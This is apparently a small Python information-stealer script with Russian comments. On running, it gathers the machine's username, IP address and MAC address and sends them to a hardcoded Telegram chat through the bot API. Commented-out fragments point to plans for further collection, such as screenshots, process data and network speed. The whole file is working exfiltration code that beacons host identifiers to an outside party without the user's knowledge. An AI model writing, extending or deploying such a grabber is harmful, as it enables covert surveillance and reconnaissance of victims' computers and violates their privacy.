import requests

import getpass
import os
import socket
import platform
from uuid import getnode as get_mac

#from datetime import datetime
#import pyautogui
#from speedtest import Speedtest
import telebot
from telebot import types
#import psutil
#from PIL import Image

#bot = telebot.TeleBot("")  # Подключение бота

token = ""
chat_id = "404628537"
message = "Собираем информацию..."

name = getpass.getuser()    # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn())   # IP-адрес системы
mac = str(hex(get_mac()))   # MAC адрес
ost = platform.uname()    # Название операционной системы

message ='IP adress: ' + ip + '\n' + 'Имя машины: ' + name + '\n' + 'MAC адресс: ' + mac


url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
print(requests.get(url).json()) # Эта строка отсылает сообщение



#from speedtest import Speedtest # Импорт модуля. Рассматривался выше
#inet = Speedtest()
#download = float(str(inet.download())[0:2] + "." # Входящая скорость
#                + str(round(inet.download(), 2))[1]) * 0.125
#uploads = float(str(inet.upload())[0:2] + "."   # Исходящая скорость
#                + str(round(inet.download(), 2))[1]) * 0.125
